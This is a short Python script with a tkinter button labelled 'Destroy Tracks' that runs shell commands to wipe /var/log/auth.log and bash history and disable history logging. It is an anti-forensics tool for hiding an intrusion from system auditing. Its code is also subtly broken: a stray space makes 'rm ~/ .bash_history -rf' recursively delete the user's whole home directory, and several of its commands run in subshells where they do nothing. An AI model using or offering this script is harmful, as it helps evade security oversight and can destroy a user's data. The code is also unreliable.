#!/usr/bin/env python
import subprocess
from tkinter.constants import BOTTOM
print("Installing packages for you...")
print()
subprocess.call("sudo apt-get install python3-tk", shell = True)
subprocess.call("sudo apt-get install python3-tk", shell= True)
import tkinter as tk
changeStat = ""


def cover():
    global changeStat
    changeStat="Relax, I am going to delete everything..."
    label.config(text=changeStat)


    subprocess.call("echo "" > /var/log/auth.log ", shell = True)
    subprocess.call("echo "" > ~/ .bash_history", shell = True)
    subprocess.call("rm ~/ .bash_history -rf", shell = True)
    subprocess.call("history -c", shell = True)
    subprocess.call("export HISTFILESIZE=0", shell = True)
    subprocess.call("export HISTSIZE=0", shell = True)
    subprocess.call("unset HISTFILE", shell = True)
    subprocess.call("ln /dev/null ~/ .bash_history -sf", shell = True)




top = tk.Tk()
top.geometry('400x300')
destroy = tk.Button(text="Destroy Tracks", fg='blue' , width=400, command=cover)
destroy.grid(row = 0, column = 3, padx = 100)
destroy.pack(side=BOTTOM)

label = tk.Label(text="Clearing auth.log file...", name="label-status" )
label.pack()


top.mainloop()




